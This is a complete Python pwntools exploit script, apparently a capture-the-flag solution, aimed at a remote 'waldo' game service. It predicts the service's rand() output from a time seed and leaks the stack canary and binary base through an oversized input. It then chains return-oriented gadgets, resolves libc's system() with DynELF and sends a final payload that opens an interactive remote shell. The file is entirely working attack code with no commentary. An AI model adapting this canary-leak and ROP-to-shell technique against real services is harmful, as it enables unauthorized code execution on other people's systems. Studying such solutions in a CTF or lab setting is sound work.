from pwn import *
import textwrap
import ctypes
libc = ctypes.CDLL('libc.so.6')

HOST, PORT = "waldo.420blaze.in", "420"
# HOST, PORT = "0.0.0.0", 31337
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("? ")
ii = lambda x: r.sendline(str(x))

def genwaldo():
	pos = libc.rand() % 17
	w = 2 * (pos + 8)
	h = pos + 8
	pos = libc.rand() % (w * h)
	return pos / w, pos % w

canary = None
def recvwaldo(recv=False):
	global canary, stack, base
	r.recvline()
	data = r.recvuntil('\nWaldo\'s found', drop=True)
	for i in range(8, 100):
		lines = data[i::i+1]
		if lines.strip('\n') == '':
			break
	width = i
	realdata = ''
	for i in range(len(data) / width):
		realdata += data[(width+1)*i:][:width]
	pos = realdata.find('W')
	if recv:
		realdata = realdata[0:][:32]
		canary = realdata[8:16]
		stack = u64(realdata[16:24])
		base = u64(realdata[24:32]) - 0xc43
		print hex(base)
		print canary.encode('hex')
		print `realdata`
	return width

menu()
ii('y')
libc.srand(libc.time(0))
print recvwaldo()
genwaldo()
ii('a')
cnt = 2000
# cnt = 0
menu()
ii('y' + 'a' * cnt)
menu()
recvwaldo(True)
a, b = genwaldo()
ii(a)
ii(b)
for i in range(31):
	a, b = genwaldo()
	ii(a)
	ii(b)
r.recvuntil('name:')
poprdi = base + 0x1113
stack += 0x100
framesize = 0x400
def leak(addr):
	global stack
	if '\n' in p64(addr):
		return
	payload = '\x00'.rjust(72, '\x00') + canary + p64(stack + 0x100) + p64(poprdi) + p64(addr) + p64(base + 0x998) + p64(poprdi) + p64(base + 0x12b0) + p64(base + 0x998) + p64(base + 0x1056)
	stack -= framesize
	ii(payload)
	r.recvuntil('Congratz !\n')
	data = r.recvuntil('\nTop score', drop=True) + '\x00'
	print `data`
	return data
d = DynELF(leak, base, elf=ELF('waldo'))
system = d.lookup('system', 'libc')
print hex(system)
payload = 'sh # '.rjust(72) + canary + p64(stack) + p64(poprdi) + p64(stack + framesize + 0x4a0 - 0x380) + p64(system) + 'sh\x00'
ii(payload)
r.interactive()

